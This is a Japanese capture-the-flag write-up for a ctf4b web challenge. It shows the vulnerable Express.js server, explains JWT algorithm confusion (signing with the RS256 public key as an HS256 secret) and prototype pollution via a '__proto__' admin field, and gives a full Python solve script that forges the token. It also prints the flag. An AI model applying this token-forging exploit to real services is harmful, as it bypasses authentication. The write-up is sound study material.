# writeup

問題の実装は以下。jwtのpayloadのadminパラメータとセッションに保存されるオブジェクトのadminパラメータを`true`にするとflagが得られる。
```:.js
const express = require('express');
const session = require('express-session');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const _ = require('lodash');

const { readKeyFromFile, generateRandomString, getAdminPassword } = require('./utils');

const HOST = process.env.CTF4B_HOST;
const PORT = process.env.CTF4B_PORT;
const FLAG = process.env.CTF4B_FLAG;

const app = express();
app.use(express.json());

app.use(session({
  secret: generateRandomString(),
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if(!username || !password) {
    res.status(400).json({ error: 'Please send username and password' });
    return;
  }

  const user = {
    id: uuidv4(), 
    username: username,
    password: password
  };
  if (username === "admin" && password === getAdminPassword()) {
    user.admin = true;
  }
  req.session.user = user;

  let signed;
  try {
    signed = jwt.sign(
      _.omit(user, ['password']),
      readKeyFromFile('keys/private.key'), 
      { algorithm: 'RS256', expiresIn: '1h' } 
    );
  } catch (err) {
    res.status(500).json({ error: 'Internal server error' });
    return;
  }
  res.header('Authorization', signed);

  res.json({ message: 'ok' });
});

app.post('/flag', (req, res) => {
  if (!req.header('Authorization')) {
    res.status(400).json({ error: 'No JWT Token' });
    return;
  }

  if (!req.session.user) {
    res.status(401).json({ error: 'No User Found' });
    return;
  }

  let verified;
  try {
    verified = jwt.verify(
      req.header('Authorization'),
      readKeyFromFile('keys/public.key'), 
      { algorithms: ['RS256', 'HS256']
    });
  } catch (err) {
    res.status(401).json({ error: 'Invalid Token' });
    return;
  }

  if (req.session.user.username !== "admin" || req.session.user.password !== getAdminPassword()) {
    verified = _.omit(verified, ['admin']);
  }

  const token = Object.assign({}, verified);
  const user = Object.assign(req.session.user, verified);

  if (token.admin && user.admin) {
    res.send(`Congratulations! Here's your flag: ${FLAG}`);
    return;
  }

  res.send('No flag for you');
});

app.listen(PORT, HOST, () => {
  console.log(`Server is running on port ${PORT}`);
});
```

通常、jwtの署名にはRS256が使用され、秘密鍵を用いて署名がなされる。
```:.js
signed = jwt.sign(
    _.omit(user, ['password']),
    readKeyFromFile('keys/private.key'), 
    { algorithm: 'RS256', expiresIn: '1h' } 
);
```

jwtの署名検証部分では、RS256の他にHS256を使用することが可能。
```:.js
verified = jwt.verify(
    req.header('Authorization'),
    readKeyFromFile('keys/public.key'), 
    { algorithms: ['RS256', 'HS256']
});
```

ここでは、RS256の公開鍵をHS256の共通鍵として使用する攻撃が可能となる。配布ファイルから得た公開鍵を用いて、署名アルゴリズムをHS256としてjwtに署名を付与することで署名の検証をバイパスできる（[参考](https://scgajge12.hatenablog.com/entry/jwt_security)）。

また、adminのパスワードを持っていないと、jwtのpayloadのadminパラメータが削除される。しかし、[`Object.assign()`](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/assign)が使用され、`verified`の全てのプロパティの浅いコピーを空のオブジェクト、`req.session.user`に実行する。

```:.js
if (req.session.user.username !== "admin" || req.session.user.password !== getAdminPassword()) {
    verified = _.omit(verified, ['admin']);
}

const token = Object.assign({}, verified);
const user = Object.assign(req.session.user, verified);

if (token.admin && user.admin) {
    res.send(`Congratulations! Here's your flag: ${FLAG}`);
    return;
}
```

ここで、jwtのpayloadに`__proto__.admin = true`を加えることで最後の検証をバイパスできる。これは、jwtのpayloadが`JSON.parse()`によってJSON文字列からJavascriptのオブジェクトに[変換され](https://github.com/auth0/node-jsonwebtoken/blob/a99fd4b473e257c2f50ff69c716db1c520bf9a78/decode.js#L12)、`Object.assign()`により`__proto__`を介してadminパラメータが該当オブジェクトにコピーされるためである（[参考](https://www.fastify.io/docs/latest/Guides/Prototype-Poisoning/)）。

```
> const jwt_payload = '{"__proto__": { "admin": true }}';
> const verified = JSON.parse(jwt_payload);
> verified
{ ['__proto__']: { admin: true } }
> const token = Object.assign({}, verified);
> token.admin
true
```

最終的に以下のスクリプトを用いてflagを取得することができる。

```:.py
import os
import json
import sys
import requests
import jwt
import textwrap

def solve(url):
    # /register
    register_data = {
        "username": "alice",
        "password": "password"
    }

    s = requests.Session()

    register_response = s.post(f'{url}/register', json=register_data)

    if register_response.status_code != 200:
        print(f"Register request failed: {register_response.status_code}, {register_response.text}")
        sys.exit()

    # /flag
    payload = {
        "__proto__": {
            "admin": True
        }
    }

    pubkey = textwrap.dedent('''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3NcjHBbKAAhJd6P+TviV
h/WRXtxtKBJLPQYIlmZ/I35WlQLpNXR9Q0YiQLMNW0E3MTHISQlQE5hBF8S2Z2tC
0SmiAMr3QQjaIA3vmefA/CXSp4YjIbKz75Nwzczk7spYiVwEbYoLOpovnl+KB6Tj
XJWCFXvgpL6xYu9Se8msgqVIl+cWANlmPdBuDRvF/7KUboHsdZsn1mL88JoTnk9u
sVp9PP+bpbcFEzwzfS+YkjwUhXFHHNPqsu9eKZZlpkRbl3lZzzxgX4G/bh3BkaCO
wp4Pv1ptk8NJH8N96USDw3Lpgc6wGReoyCBY7Dtg1a3IHNjQQwQg+rd+1yUUfPAe
qa9MbLWr3hYQn+9G4SxTwmWptGJLLjZMzfELtGxiZTHlnifP4nHSNJ8WdGJ63YU9
7LiwkWsE8BVIPi+f/oNIbhhgJzGSD57mkdN0wNloN0I+83/0g2TnVSvkSM5ow/E9
h2w/qaT9LfjtYiZbFFc95lwcaR1nUO/hmZ2okTt7Nh5tlefbvHNSyHMFuvTiEanI
xO2kJIXugy9h9pNAX8jlNHNQWT1WM5HI3t8aMcsucjOT9wTWh7Hl0qxrO4f7f2kP
HODGSRQ/uR9czPYtXP4HPAPUToZ9Xzc5Voj3Q/bzRcAnkKH6fmUOtLPd2XhTDTFl
A5kHBxj92CnlYq6/bQdXDy0CAwEAAQ==
-----END PUBLIC KEY-----
    ''')

    forged_jwt = jwt.encode(payload, pubkey, algorithm="HS256")

    headers = {
        "Authorization": forged_jwt.decode(),
        "Content-Type": "application/json"
    }

    flag_response = s.post(f'{url}/flag', headers=headers)

    if flag_response.status_code != 200:
        print(f"Get flag request failed: {flag_response.status_code}, {flag_response.text}")
        sys.exit()

    return flag_response.text

if __name__ == "__main__":
    flag = solve("問題サーバのURL")
    print(flag) # Congratulations! Here's your flag: ctf4b{Pr0707yp3_P0llU710n_f0R_7h3_w1n}
```